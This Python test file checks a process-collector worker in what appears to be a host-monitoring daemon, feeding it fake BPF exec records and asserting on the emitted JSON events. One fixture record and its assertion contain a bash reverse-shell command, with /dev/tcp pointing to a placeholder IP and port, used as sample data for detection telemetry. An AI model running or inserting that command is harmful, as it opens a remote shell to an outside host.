"""Tests the ProcessCollectorWorker independently of the BPF runtime.

The worker is parameterized with a stream factory so tests can inject a fake
that yields a fixed sequence of records.
"""

from __future__ import annotations

import json
from io import BytesIO
from typing import Any

from inspectord.workers.process_collector.__main__ import ProcessCollectorWorker


class FakeStream:
    """Stand-in for inspectord._native.ProcessExecStream."""

    def __init__(self, batches: list[list[dict[str, Any]]]) -> None:
        self._batches = batches
        self._closed = False

    def poll(self, timeout_ms: int) -> list[dict[str, Any]]:
        if not self._batches:
            return []
        return self._batches.pop(0)

    def close(self) -> None:
        self._closed = True


def _read_events(buf: BytesIO) -> list[dict[str, Any]]:
    buf.seek(0)
    return [json.loads(line) for line in buf.read().splitlines() if line]


def test_worker_emits_event_per_record() -> None:
    sink = BytesIO()
    stream = FakeStream(
        [
            [
                {
                    "timestamp_ns": 1_700_000_000_000_000_000,
                    "pid": 1234,
                    "ppid": 999,
                    "uid": 1000,
                    "gid": 1000,
                    "comm": "bash",
                    "cmdline": "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1",
                }
            ]
        ]
    )
    worker = ProcessCollectorWorker(
        stream_factory=lambda: stream,
        sink=sink,
        host_name="test-host",
    )
    worker.start()
    worker.step(poll_timeout_ms=10)
    worker.stop()

    events = _read_events(sink)
    assert len(events) == 1, events
    ev = events[0]
    assert ev["module"] == "process_collector"
    assert ev["action"] == "process_start"
    assert ev["kind"] == "event"
    assert ev["category"] == ["process"]
    assert ev["type"] == ["start"]
    assert ev["severity"] == "info"
    assert ev["host"]["name"] == "test-host"
    assert ev["process"]["pid"] == 1234
    assert ev["process"]["name"] == "bash"
    assert ev["process"]["command_line"] == "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"
    assert ev["process"]["parent"]["pid"] == 999
    assert ev["user"]["id"] == "1000"


def test_worker_empty_poll_is_a_noop() -> None:
    sink = BytesIO()
    stream = FakeStream([])
    worker = ProcessCollectorWorker(
        stream_factory=lambda: stream,
        sink=sink,
        host_name="test-host",
    )
    worker.start()
    worker.step(poll_timeout_ms=1)
    worker.stop()

    assert _read_events(sink) == []


def test_worker_closes_stream_on_stop() -> None:
    sink = BytesIO()
    stream = FakeStream([])
    worker = ProcessCollectorWorker(
        stream_factory=lambda: stream,
        sink=sink,
        host_name="test-host",
    )
    worker.start()
    worker.stop()
    assert stream._closed is True
